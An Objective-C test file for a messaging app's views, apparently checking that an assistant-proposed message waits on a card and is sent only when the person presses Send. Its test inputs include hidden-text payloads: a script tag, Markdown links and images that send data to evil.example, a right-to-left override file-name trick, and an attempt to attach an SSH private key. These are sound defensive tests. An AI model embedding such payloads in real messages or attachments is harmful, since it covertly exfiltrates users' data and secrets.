// Shenzhen Friends views tests: a message a `/` command proposed. It waits above the composer, shown character for
// character, with Send and Edit; only the person's Send calls the host's `send`; Edit moves it into the composer; it
// outlives the composer that showed it, and an incomplete host's proposal falls back to a draft.

#import "SZFriendsViewsTestSupport.h"

#import "mac/SZFriendsComposerInternal.h"

// Stands in for the dropdown, which takes Escape from whatever has focus inside it.
@interface SZFProposalEscapeRecorder : NSView <SZFriendsEscapeHandling>
@property(nonatomic) NSUInteger escapes;
@end
@implementation SZFProposalEscapeRecorder
- (void)friendsHandleEscape {
    self.escapes += 1;
}
@end

static SZFriendsAttachableItem *SZFDocument(NSString *path, NSString *document) {
    SZFriendsAttachableItem *item = [SZFriendsAttachableItem new];
    item.title = path.lastPathComponent;
    item.kindLabel = @"PDF";
    item.fileURL = [NSURL fileURLWithPath:path];
    if (document) item.revision = @{@"source" : @"com.example.friends-views-tests", @"document_id" : document,
                                    @"revision_id" : @"r_1", @"size" : @1};
    return item;
}

static SZFriendsConversationPage *SZFPage(SZFriendsContext *context) {
    SZFriendsConversationPage *page = [[SZFriendsConversationPage alloc] initWithContext:context
                                                                          conversationID:@"c_mei"
                                                                        highlightMessage:nil];
    page.frame = NSMakeRect(0, 0, 400, 640);
    [page applySnapshot:SZFTestSnapshot(@"conversation-mei")];
    return page;
}

// Runs `command` from `page`'s composer and answers it with `result`.
static void SZFRunAndAnswer(SZFriendsConversationPage *page, SZFTestAssistant *assistant, NSString *command,
                            SZFriendsAssistantResult *result) {
    NSTextView *text = page.composer.textView;
    [text insertText:@"/" replacementRange:NSMakeRange(NSNotFound, 0)];
    [text insertText:command replacementRange:NSMakeRange(NSNotFound, 0)];
    [page.composer.command run];
    assistant.completion(result, nil);
    [page layoutSubtreeIfNeeded];
}

static NSUInteger SZFSends(SZFTestTransport *transport) {
    NSUInteger sends = 0;
    for (NSDictionary *frame in transport.sent) sends += [frame[@"type"] isEqualToString:@"send_message"];
    return sends;
}

static BOOL SZFShowsText(NSView *root, NSString *words) {
    for (NSTextField *field in SZFTestSubviews(root, NSTextField.class)) {
        BOOL visible = YES;
        for (NSView *view = field; view && view != root; view = view.superview) visible = visible && !view.hidden;
        if (visible && [field.stringValue isEqualToString:words]) return YES;
    }
    return NO;
}

// Every character of `text` is in the card, laid out inside the box's width: no line runs past it or under the
// scroller, nothing is cut, and the box scrolls down to the last line. Returns why not, or nil.
static NSString *SZFMissingFromCard(SZFriendsProposalView *card, NSString *text) {
    NSTextView *view = card.textView;
    if (![view.string isEqualToString:text]) return [NSString stringWithFormat:@"shows %@", view.string];
    NSTextStorage *storage = view.textStorage;
    for (NSAttributedStringKey key in @[ NSLinkAttributeName, NSAttachmentAttributeName ]) {
        NSRange found = NSMakeRange(0, 0);
        id value = storage.length ? [storage attribute:key atIndex:0 longestEffectiveRange:&found
                                               inRange:NSMakeRange(0, storage.length)]
                                  : nil;
        if (value || found.length < storage.length) return [NSString stringWithFormat:@"%@ in the text", key];
    }
    NSLayoutManager *layout = view.layoutManager;
    NSTextContainer *container = view.textContainer;
    [layout ensureLayoutForTextContainer:container];
    NSRange glyphs = [layout glyphRangeForTextContainer:container];
    NSRange characters = [layout characterRangeForGlyphRange:glyphs actualGlyphRange:NULL];
    if (characters.length != text.length) return [NSString stringWithFormat:@"%lu of %lu characters laid out",
                                                                            (unsigned long)characters.length,
                                                                            (unsigned long)text.length];
    CGFloat visibleWidth = NSWidth(card.textScroll.contentView.bounds);
    if (card.textScroll.hasHorizontalScroller || NSWidth(view.frame) > visibleWidth + 0.5)
        return [NSString stringWithFormat:@"scrolls sideways: %.1f in %.1f", NSWidth(view.frame), visibleWidth];
    __block CGFloat widest = 0, bottom = 0;
    [layout enumerateLineFragmentsForGlyphRange:glyphs
                                     usingBlock:^(NSRect rect, NSRect used, NSTextContainer *inContainer,
                                                  NSRange lineGlyphs, BOOL *stop) {
                                         (void)rect, (void)inContainer, (void)lineGlyphs, (void)stop;
                                         widest = MAX(widest, NSMaxX(used));
                                         bottom = MAX(bottom, NSMaxY(used));
                                     }];
    CGFloat scrollerRoom = [NSScroller scrollerWidthForControlSize:NSControlSizeRegular
                                                     scrollerStyle:NSScrollerStyleLegacy];
    // Inside what shows, and clear of the scroller even when one appears for a longer message.
    CGFloat limit = MIN(visibleWidth, NSWidth(card.textScroll.frame) - scrollerRoom);
    CGFloat inset = view.textContainerInset.width;
    if (inset + widest > limit + 0.5)
        return [NSString stringWithFormat:@"a line reaches %.1f pt of %.1f", inset + widest, limit];
    if (NSHeight(view.frame) + 0.5 < bottom + view.textContainerInset.height)
        return [NSString stringWithFormat:@"the last line at %.1f, the text %.1f tall", bottom, NSHeight(view.frame)];
    return nil;
}

// What a command proposes waits above the composer, with the files from the person's chips, Send and Edit; nothing
// is sent until Send.
static void SZFTestCard(void) {
    SZFTestTransport *transport = nil;
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsContext *context = SZFTestContext(host, SZFTestReadyLink(&transport));
    SZFTestClock *clock = [SZFTestClock new];
    SZFTestInstallClock(context, clock);
    SZFriendsConversationPage *page = SZFPage(context);
    NSWindow *window = SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFriendsComposerView *composer = page.composer;
    SZFriendsAttachableItem *contract = SZFDocument(@"/tmp/Contract.pdf", @"d_contract");
    [composer addAttachments:@[ contract ]];
    SZFTestProposal *proposal = SZFTestProposalWithText(@"Here are pages 3–5 of the contract, Mei.", @[
        contract, SZFDocument(@"/tmp/Contract pages 3-5.pdf", @"d_contract")
    ]);
    SZFRunAndAnswer(page, host.assistant, @"send Mei pages 3-5", proposal.result);
    SZFriendsProposalView *card = composer.command.proposalView;
    SZFExpect(card.superview == composer && !card.hidden && composer.commandState == SZFriendsCommandStateOff &&
                  composer.textView.string.length == 0 && !composer.sendButton.hidden,
              @"the proposal shows on a card; the field is free again");
    SZFExpect(NSMaxY(card.frame) <= NSMinY([composer convertRect:composer.inputBox.bounds fromView:composer.inputBox]),
              @"above the field: %@", NSStringFromRect(card.frame));
    SZFExpect(SZFMissingFromCard(card, proposal.result.text) == nil, @"the message: %@",
              SZFMissingFromCard(card, proposal.result.text));
    NSArray *files = [card.fileViews valueForKey:@"accessibilityLabel"];
    SZFExpect([files isEqual:(@[ @"Contract.pdf", @"Contract pages 3-5.pdf" ])],
              @"the files going with it: the person's chip and pages cut from it: %@", files);
    SZFExpect(composer.attachments.count == 0,
              @"the chip moved to the card, so the composer's own Send can't send it without the message");
    SZFExpect(SZFShowsText(card, proposal.result.note), @"the host's note on the card");
    SZFExpect([card.sendButton.title isEqualToString:@"Send"] && card.sendButton.style == SZFriendsButtonStylePrimary &&
                  [card.editButton.title isEqualToString:@"Edit"] && NSMinX(card.editButton.frame) <
                                                                         NSMinX(card.sendButton.frame),
              @"Edit, then Send as the primary button, in the composer's own word");
    SZFExpect(SZFTestMissedHits(card.sendButton, window.contentView) == 0 &&
                  SZFTestMissedHits(card.editButton, window.contentView) == 0,
              @"each one full target");
    SZFriendsButton *ownSend = composer.sendButton;
    SZFExpect(!ownSend.enabled && ownSend.style == SZFriendsButtonStyleSecondary,
              @"the card's Send is the one primary action: the composer's own is secondary, off with nothing in it");
    [composer.textView insertText:@"See you Thursday." replacementRange:NSMakeRange(NSNotFound, 0)];
    SZFExpect(ownSend.enabled && ownSend.style == SZFriendsButtonStyleSecondary, @"words of its own turn it on");
    [composer.textView selectAll:nil];
    [composer.textView deleteBackward:nil];
    SZFExpect(!ownSend.enabled, @"and emptied, off again");
    SZFExpect(proposal.sends == 0 && SZFSends(transport) == 0, @"nothing sent before Send");
    SZFExpect([clock.spoken.lastObject hasSuffix:proposal.result.note], @"VoiceOver hears the note: %@",
              clock.spoken.lastObject);
    SZFExpect(context.assistantProposals[@"c_mei"] != nil, @"the conversation holds the proposal");
    SZFProposalEscapeRecorder *dropdown = [[SZFProposalEscapeRecorder alloc] initWithFrame:page.frame];
    NSView *content = page.superview;
    [content addSubview:dropdown];
    [dropdown addSubview:page];
    [card.textView cancelOperation:nil];
    SZFExpect(dropdown.escapes == 1, @"Escape in the card's text goes to the dropdown, as from anywhere else");
}

// The card is the message Friends delivers, character for character: Markdown that would hide text when drawn
// (raw HTML, comments, reference definitions, link titles and addresses, a long code line) shows as typed.
static void SZFTestLiteral(void) {
    NSString *code = [@"" stringByPaddingToLength:300 withString:@"total_mm = 48200 + " startingAtIndex:0];
    NSArray<NSString *> *messages = @[
        [@"Hi <span title=\"SECRET-attribute\">there</span><script>steal('SECRET-script')</script>"
            stringByAppendingString:@"<style>.x{content:'SECRET-style'}</style>"],
        @"Summary attached. <!-- SECRET-comment: the contract total is 48,200 -->",
        @"See [the plan][p].\n\n[p]: https://evil.example/c?d=SECRET-reference \"SECRET-definition-title\"",
        @"[report](https://example.com/report \"SECRET-link-title\")",
        [NSString stringWithFormat:@"```\n%@\n```", code],
        [@"[the plan](https://evil.example/collect?data=SECRET-address) ![](https://evil.example/p.png?SECRET-image) "
            stringByAppendingString:@"<https://evil.example/SECRET-autolink>"],
    ];
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsConversationPage *page = SZFPage(SZFTestContext(host, SZFTestReadyLink(NULL)));
    SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameAqua);
    for (NSString *message in messages) {
        SZFRunAndAnswer(page, host.assistant, @"send it", SZFTestProposalWithText(message, @[]).result);
        NSString *missing = SZFMissingFromCard(page.composer.command.proposalView, message);
        SZFExpect(missing == nil, @"every character shows for %@: %@", [message substringToIndex:MIN(40u,
                                                                                                     message.length)],
                  missing);
    }
    NSLayoutManager *layout = page.composer.command.proposalView.textView.layoutManager;
    __block NSUInteger lines = 0;
    [layout enumerateLineFragmentsForGlyphRange:NSMakeRange(0, layout.numberOfGlyphs)
                                     usingBlock:^(NSRect r, NSRect u, NSTextContainer *c, NSRange g, BOOL *s) {
                                         (void)r, (void)u, (void)c, (void)g, (void)s;
                                         lines++;
                                     }];
    SZFExpect(lines >= 4, @"the long code line wraps instead of scrolling sideways: %lu lines", (unsigned long)lines);

    NSMutableString *letter = [NSMutableString string];
    for (int line = 1; line <= 40; line++) [letter appendFormat:@"Line %d of a long message.\n", line];
    [letter appendString:@"SECRET-last-line"];
    SZFRunAndAnswer(page, host.assistant, @"send it", SZFTestProposalWithText(letter, @[]).result);
    SZFriendsProposalView *card = page.composer.command.proposalView;
    NSString *missing = SZFMissingFromCard(card, letter);
    SZFExpect(missing == nil, @"a long message is all there: %@", missing);
    NSScrollView *scroll = card.textScroll;
    SZFExpect(NSHeight(scroll.frame) <= 170 && NSHeight(card.textView.frame) > NSHeight(scroll.frame) &&
                  scroll.verticalScroller && !scroll.verticalScroller.hidden,
              @"it scrolls down inside a box of bounded height, with a scroller that shows there is more: %.0f in %.0f",
              NSHeight(card.textView.frame), NSHeight(scroll.frame));
    NSArray<NSView *> *fades = SZFTestSubviews(card, SZFriendsEdgeFade.class);
    SZFExpect(fades.count == 1 && !fades[0].hidden, @"a fade over the last visible line says there is more");
    CGFloat end = NSHeight(card.textView.frame) - NSHeight(scroll.contentView.bounds);
    [scroll.contentView scrollToPoint:NSMakePoint(0, end)];
    [scroll reflectScrolledClipView:scroll.contentView];
    SZFExpect(fades.count == 1 && fades[0].hidden, @"and goes at the end of the message");
}

// Characters that draw nothing show as their code point, so nothing hidden rides along; ordinary emoji stay whole.
static void SZFTestHiddenCharacters(void) {
    for (NSNumber *c in @[ @0x200B, @0x200C, @0x200D, @0x202E, @0x2066, @0xFEFF, @0xFE0F, @0xE0041, @0x00AD, @0x0007,
                           @0xFFFC ])
        SZFExpect(SZFriendsCharacterDrawsNothing(c.unsignedIntValue), @"U+%04X draws nothing", c.unsignedIntValue);
    for (NSNumber *c in @[ @'a', @'\n', @'\t', @0x4F60, @0x2764, @0x1F469, @0x00A0 ])
        SZFExpect(!SZFriendsCharacterDrawsNothing(c.unsignedIntValue), @"U+%04X draws", c.unsignedIntValue);
    NSString *text = @"Looks right.​​‌‮gnp.exe⁦ ❤️ \U0001F469‍\U0001F4BB "
                     @"1️⃣ 你‍好 a️b";
    SZFriendsAppearance *appearance = [SZFriendsAppearance new];
    NSAttributedString *shown = SZFriendsLiteralText(text, appearance.bodyFont, NSColor.textColor, NSColor.orangeColor);
    NSString *string = shown.string;
    for (NSString *mark in @[ @" U+200B ×2 U+200C U+202E ", @" U+2066 ", @"你 U+200D 好", @"a U+FE0F b" ])
        SZFExpect([string containsString:mark], @"%@ in %@", mark, string);
    for (NSString *hidden in @[ @"​", @"‌", @"‮", @"⁦" ])
        SZFExpect(![string containsString:hidden], @"no raw U+%04X left", [hidden characterAtIndex:0]);
    for (NSString *emoji in @[ @"❤️", @"\U0001F469‍\U0001F4BB", @"1️⃣" ])
        SZFExpect([string containsString:emoji], @"%@ stays whole", emoji);
    NSRange mark = [string rangeOfString:@"U+202E"];
    SZFExpect(mark.location != NSNotFound &&
                  [[shown attribute:NSForegroundColorAttributeName atIndex:mark.location effectiveRange:NULL]
                      isEqual:NSColor.orangeColor] &&
                  [shown attribute:NSBackgroundColorAttributeName atIndex:mark.location effectiveRange:NULL],
              @"marks stand out from the message");
    SZFExpect([string hasPrefix:@"Looks right."] && [string hasSuffix:@"b"], @"the rest as typed: %@", string);
}

// Send: the host's `send`, once per press, a spinner with the host's words while under way; a failure keeps the card
// with the host's words and Send ready again; success clears the card and the chips that went.
static void SZFTestSend(void) {
    SZFTestTransport *transport = nil;
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsContext *context = SZFTestContext(host, SZFTestReadyLink(&transport));
    SZFriendsConversationPage *page = SZFPage(context);
    SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameDarkAqua);
    SZFriendsComposerView *composer = page.composer;
    SZFriendsAttachableItem *contract = SZFDocument(@"/tmp/Contract.pdf", @"d_contract");
    SZFriendsAttachableItem *photos = SZFDocument(@"/tmp/Site photos.pdf", @"d_photos");
    [composer addAttachments:@[ contract, photos ]];
    SZFTestProposal *proposal = SZFTestProposalWithText(@"Here is the contract.", @[ contract ]);
    SZFRunAndAnswer(page, host.assistant, @"send Mei the contract", proposal.result);
    SZFriendsProposalView *card = composer.command.proposalView;
    SZFExpect([[composer.attachments valueForKey:@"title"] isEqual:@[ @"Site photos.pdf" ]],
              @"a chip the proposal doesn't take stays in the composer");
    SZFExpect(composer.sendButton.enabled && composer.sendButton.style == SZFriendsButtonStyleSecondary,
              @"with that chip the composer's own Send works, secondary while the card waits");
    [card.sendButton performClick:nil];
    [page layoutSubtreeIfNeeded];
    SZFExpect(proposal.sends == 1 && !card.sendButton.enabled && !card.editButton.enabled &&
                  SZFShowsText(card, @"Sending…"),
              @"Send calls the host's send, with its words beside the spinner");
    [card.sendButton performClick:nil];
    [composer.command sendProposal];
    SZFExpect(proposal.sends == 1, @"never twice at once: %lu", (unsigned long)proposal.sends);
    SZFTestAnswerProposal(proposal, [NSError errorWithDomain:@"test" code:1 userInfo:@{
        NSLocalizedDescriptionKey : @"Friends isn’t running. Open the Friends menu, then try again."}]);
    [page layoutSubtreeIfNeeded];
    SZFExpect(!card.hidden && card.sendButton.enabled && card.editButton.enabled &&
                  SZFShowsText(card, @"Friends isn’t running. Open the Friends menu, then try again.") &&
                  [card.statusLabel.textColor isEqual:context.appearance.destructiveColor],
              @"a failure keeps the card with the host's words, Send ready again");
    [card.sendButton performClick:nil];
    SZFExpect(proposal.sends == 2, @"Send tries again");
    void (^done)(NSError *) = proposal.done;
    SZFTestAnswerProposal(proposal, nil);
    [page layoutSubtreeIfNeeded];
    SZFExpect(card.hidden && context.assistantProposals[@"c_mei"] == nil &&
                  [[composer.attachments valueForKey:@"title"] isEqual:@[ @"Site photos.pdf" ]],
              @"sent: the card goes, and the chip that went with it");
    SZFExpect(composer.sendButton.style == SZFriendsButtonStylePrimary && composer.sendButton.enabled,
              @"the composer's Send is the primary action again");
    if (done) done([NSError errorWithDomain:@"test" code:2 userInfo:nil]);
    SZFExpect(card.hidden, @"a second answer changes nothing");
    SZFExpect(SZFSends(transport) == 0, @"the host sends; the views never queue it themselves");
}

// Edit: the message and its files move into the composer as a draft would; what the person typed meanwhile stays.
static void SZFTestEdit(void) {
    SZFTestTransport *transport = nil;
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsContext *context = SZFTestContext(host, SZFTestReadyLink(&transport));
    SZFriendsConversationPage *page = SZFPage(context);
    SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFriendsComposerView *composer = page.composer;
    SZFriendsAttachableItem *contract = SZFDocument(@"/tmp/Contract.pdf", @"d_contract");
    [composer addAttachments:@[ contract ]];
    SZFTestProposal *proposal = SZFTestProposalWithText(@"Pages 3–5 attached.", @[
        contract, SZFDocument(@"/tmp/Contract pages 3-5.pdf", @"d_contract")
    ]);
    SZFRunAndAnswer(page, host.assistant, @"send pages 3-5", proposal.result);
    [composer.command.proposalView.editButton performClick:nil];
    [page layoutSubtreeIfNeeded];
    SZFExpect([composer.textView.string isEqualToString:proposal.result.text] &&
                  [[composer.attachments valueForKey:@"title"] isEqual:(@[ @"Contract.pdf",
                                                                           @"Contract pages 3-5.pdf" ])],
              @"Edit: the message and its files in the composer: %@ %@", composer.textView.string,
              [composer.attachments valueForKey:@"title"]);
    SZFExpect(composer.command.proposalView.hidden && context.assistantProposals[@"c_mei"] == nil &&
                  proposal.sends == 0 && SZFSends(transport) == 0,
              @"the card goes and nothing was sent");
    [composer send];
    NSDictionary *sent = transport.sent.lastObject;
    SZFExpect(SZFSends(transport) == 1 && sent[@"fields"][@"via_assistant"] == nil &&
                  [sent[@"fields"][@"text"] isEqualToString:proposal.result.text],
              @"the person's Send sends it as their own message");

    composer.textView.string = @""; // as the helper's reply to that send would leave it
    SZFTestProposal *second = SZFTestProposalWithText(@"Running late, sorry!", @[]);
    SZFRunAndAnswer(page, host.assistant, @"tell Mei I'm late", second.result);
    [composer.textView insertText:@"On my way." replacementRange:NSMakeRange(NSNotFound, 0)];
    [composer.command editProposal];
    SZFExpect([composer.textView.string isEqualToString:@"On my way.\n\nRunning late, sorry!"],
              @"typed text stays first: %@", composer.textView.string);
}

// A proposal the views can't offer as one (no `send`, or a host without proposalEditLabel) fills the composer as a
// draft, which the person sends from there.
static void SZFTestFallbacks(void) {
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsConversationPage *page = SZFPage(SZFTestContext(host, SZFTestReadyLink(NULL)));
    SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFriendsAssistantResult *unsendable = SZFTestProposalWithText(@"No send block.", @[]).result;
    unsendable.send = nil;
    SZFRunAndAnswer(page, host.assistant, @"send it", unsendable);
    SZFExpect(page.composer.command.proposalView.hidden &&
                  [page.composer.textView.string isEqualToString:@"No send block."],
              @"without send: a draft");
    page.composer.textView.string = @"";
    host.assistant.plain = YES;
    SZFRunAndAnswer(page, host.assistant, @"send it", SZFTestProposalWithText(@"No Edit word.", @[]).result);
    SZFExpect(page.composer.command.proposalView.hidden &&
                  [page.composer.textView.string isEqualToString:@"No Edit word."],
              @"from a host without the card's words: a draft");
    page.composer.textView.string = @"";
    host.assistant.plain = NO;
    SZFriendsAttachableItem *contract = SZFDocument(@"/tmp/Contract.pdf", @"d_contract");
    [page.composer addAttachments:@[ contract ]];
    SZFTestProposal *foreign = SZFTestProposalWithText(@"With a key.", @[
        contract, SZFDocument(@"/Users/someone/.ssh/id_ed25519", nil)
    ]);
    SZFRunAndAnswer(page, host.assistant, @"send it", foreign.result);
    SZFExpect(page.composer.command.proposalView.hidden &&
                  [page.composer.textView.string isEqualToString:@"With a key."] &&
                  [[page.composer.attachments valueForKey:@"title"] isEqual:@[ @"Contract.pdf" ]],
              @"with a file the person never attached: a draft, without that file, since the card can't show "
              @"everything send would send: %@", [page.composer.attachments valueForKey:@"title"]);
}

// The proposal belongs to the conversation: a result with no composer waits for the next one, and a send under way
// finishes on whichever composer shows the conversation then, or in its draft.
static void SZFTestOutlivesComposer(void) {
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsContext *context = SZFTestContext(host, SZFTestReadyLink(NULL));
    SZFriendsAttachableItem *contract = SZFDocument(@"/tmp/Contract.pdf", @"d_contract");
    SZFTestProposal *proposal = SZFTestProposalWithText(@"The contract, as promised.", @[ contract ]);
    __weak SZFriendsConversationPage *gone = nil;
    @autoreleasepool {
        SZFriendsConversationPage *page = SZFPage(context);
        [page.composer addAttachments:@[ contract ]];
        [page.composer.textView insertText:@"/" replacementRange:NSMakeRange(NSNotFound, 0)];
        [page.composer.textView insertText:@"send the contract" replacementRange:NSMakeRange(NSNotFound, 0)];
        [page.composer.command run];
        gone = page;
        page = nil;
    }
    SZFExpect(gone == nil, @"the page went away");
    host.assistant.completion(proposal.result, nil);
    SZFExpect(context.drafts[@"c_mei"] == nil, @"the command is used up and the chip went to the card: %@",
              context.drafts[@"c_mei"].text);
    SZFriendsConversationPage *next = SZFPage(context);
    SZFTestHostWindow(next, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFriendsProposalView *card = next.composer.command.proposalView;
    SZFExpect(!card.hidden && [card.textView.string isEqualToString:proposal.result.text] &&
                  next.composer.textView.string.length == 0 && next.composer.attachments.count == 0 &&
                  next.composer.commandState == SZFriendsCommandStateOff,
              @"the next composer shows the card, its field free");
    [card.sendButton performClick:nil];
    SZFriendsConversationPage *third = SZFPage(context);
    SZFTestHostWindow(third, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFExpect(third.composer.command.proposalView.proposal.sending &&
                  !third.composer.command.proposalView.sendButton.enabled,
              @"a send under way shows as such in a new composer");
    SZFTestAnswerProposal(proposal, nil);
    SZFExpect(third.composer.command.proposalView.hidden && context.assistantProposals[@"c_mei"] == nil,
              @"and finishes there: the card goes");
}

// Blocked or no longer friends: the card's Send is off with the composer's.
static void SZFTestDisabled(void) {
    SZFTestAssistantHost *host = [SZFTestAssistantHost new];
    host.assistant = [SZFTestAssistant new];
    SZFriendsConversationPage *page = SZFPage(SZFTestContext(host, SZFTestReadyLink(NULL)));
    SZFTestHostWindow(page, NSMakeSize(400, 640), NSAppearanceNameAqua);
    SZFTestProposal *proposal = SZFTestProposalWithText(@"Hello.", @[]);
    SZFRunAndAnswer(page, host.assistant, @"say hello", proposal.result);
    NSMutableDictionary *composer = [SZFTestSnapshot(@"conversation-mei")[@"composer"] mutableCopy];
    composer[@"enabled"] = @NO;
    [page.composer applyComposer:composer];
    [page.composer.command.proposalView.sendButton performClick:nil];
    SZFExpect(!page.composer.command.proposalView.sendButton.enabled && proposal.sends == 0,
              @"a disabled composer's card does not send");
}

void SZFTestAssistantProposals(void) {
    SZFTestCard();
    SZFTestLiteral();
    SZFTestHiddenCharacters();
    SZFTestSend();
    SZFTestEdit();
    SZFTestFallbacks();
    SZFTestOutlivesComposer();
    SZFTestDisabled();
}
